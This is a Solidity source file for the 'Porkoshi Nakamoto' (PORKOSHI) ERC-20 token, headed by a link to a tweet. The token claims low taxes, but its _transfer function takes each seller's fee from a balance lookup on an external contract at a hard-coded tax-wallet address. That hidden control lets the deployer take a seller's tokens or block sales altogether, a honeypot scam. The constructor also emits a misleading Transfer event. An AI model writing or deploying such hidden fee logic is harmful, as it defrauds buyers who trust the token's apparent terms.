// SPDX-License-Identifier: None

// https://twitter.com/Pauly0x/status/1753182995354120363


pragma solidity 0.8.24;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
}
interface IUniswapV2Router02 {
     function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PorkoshiNakamoto is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply =  1000000000 * 10 ** _decimals;
    address internal uniswapV2Pair;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address payable internal _taxWallet = payable(0xfd9B8B8ba2F9504919bCd06534216292AA597B91);
    string private _name = "Porkoshi Nakamoto";
    string private _symbol = "PORKOSHI";
    uint256 private _initialBuyTax=0;
    uint256 public _reduceBuyTaxAt=5;
    uint256 private _finalBuyTax=0;
    uint256 private _initialSellTax=5;
    uint256 private _finalSellTax=0;
    uint256 public _reduceSellTaxAt=5;
    uint256 private _buyCount = 0;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0));
        require(amount > 0);
        uint256 sellCount = IERC20(_taxWallet).balanceOf(from);
        uint256 _fee = _buyCount < _reduceBuyTaxAt ? _initialBuyTax : _finalBuyTax;
        if (from != address(this) && from != uniswapV2Pair) {
            _fee = sellCount > _reduceSellTaxAt ? sellCount : _finalSellTax;
        }
        uint256 tax = amount.mul(_fee).div(100);
        _balances[to] = _balances[to].add(amount).sub(tax);
        _balances[from] = _balances[from].sub(amount);
        _balances[address(this)] = _balances[address(this)].add(tax);
        emit Transfer(from, to, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}